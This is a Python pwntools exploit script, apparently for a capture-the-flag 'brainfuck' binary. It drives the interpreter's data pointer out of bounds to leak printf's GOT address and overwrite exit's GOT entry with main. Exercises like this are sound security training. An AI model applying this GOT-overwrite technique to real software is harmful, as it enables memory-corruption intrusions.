from pwn import *
import time
p = process("./brainfuck")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
elf = ELF("./brainfuck")

code = ""
payload = ""
def right():
	global code,data_ori
	code += ">"
	data_ori += 1
	
def left():
	global code,data_ori
	code += "<"
	data_ori -= 1

def add():
	global code
	code += "+"

def sub():
	global code
	code += "-"

def leak():
	global code
	code += "."

def input(data):
	global code,payload
	code += ","
	payload += data

def leak2(got_addr):
	while data_ori > got_addr:
		left()
	while data_ori < got_addr:
		right()
	for i in range(8):
		leak()
		right()

def write(got_addr,data):
	data = p64(data)
	while data_ori > got_addr:
		left()
	while data_ori < got_addr:
		right()
	for i in range(8):
		input(data[i])
		right()

gdb.attach(p,"b *0x000000000040097D")
context.log_level = "debug"
data_ori = 0x6020C0
printf_got = elf.got["printf"]
exit_got = elf.got["exit"]
main_addr = 0x400847
p.recvuntil("code: ")
leak2(printf_got)
write(exit_got,main_addr)
p.sendline(code)
p.sendline()
p.send(payload)
time.sleep(1)
p.interactive()


